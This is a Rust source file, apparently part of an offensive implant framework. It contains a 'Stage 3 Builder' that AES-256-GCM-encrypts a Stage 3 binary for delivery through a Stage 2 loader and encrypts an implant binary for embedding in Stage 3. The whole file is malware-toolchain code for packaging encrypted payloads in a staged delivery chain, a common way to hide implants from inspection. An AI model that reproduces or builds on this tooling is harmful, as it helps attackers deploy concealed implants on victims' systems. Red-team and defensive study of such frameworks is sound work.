//! Stage 3 Builder
//!
//! Encrypts Stage 3 binary for delivery via Stage 2.
//! Uses AES-256-GCM encryption matching oxide-shared.

use anyhow::{Context, Result};
use std::fs;
use std::path::Path;
use crate::crypto::encrypt_payload;

/// Build encrypted Stage 3 payload.
///
/// Stage 2 uses AES-GCM decryption, so we AES-GCM encrypt here.
pub fn build_stage3(
    stage3_path: &Path,
    output_path: &Path,
    psk: &str,
    salt: &[u8],
) -> Result<()> {
    // Read Stage 3 binary
    let stage3 = fs::read(stage3_path)
        .with_context(|| format!("Failed to read Stage 3: {}", stage3_path.display()))?;

    // AES-GCM encrypt
    let encrypted = encrypt_payload(psk, salt, &stage3);

    // Write output
    fs::write(output_path, &encrypted)
        .with_context(|| format!("Failed to write output: {}", output_path.display()))?;

    Ok(())
}

/// Build encrypted implant payload for embedding in Stage 3.
///
/// The implant is encrypted and embedded in the Stage 3 binary.
pub fn encrypt_implant(
    implant_path: &Path,
    output_path: &Path,
    psk: &str,
    salt: &[u8],
) -> Result<()> {
    // Read implant binary
    let implant = fs::read(implant_path)
        .with_context(|| format!("Failed to read implant: {}", implant_path.display()))?;

    // AES-GCM encrypt
    let encrypted = encrypt_payload(psk, salt, &implant);

    // Write output
    fs::write(output_path, &encrypted)
        .with_context(|| format!("Failed to write output: {}", output_path.display()))?;

    Ok(())
}
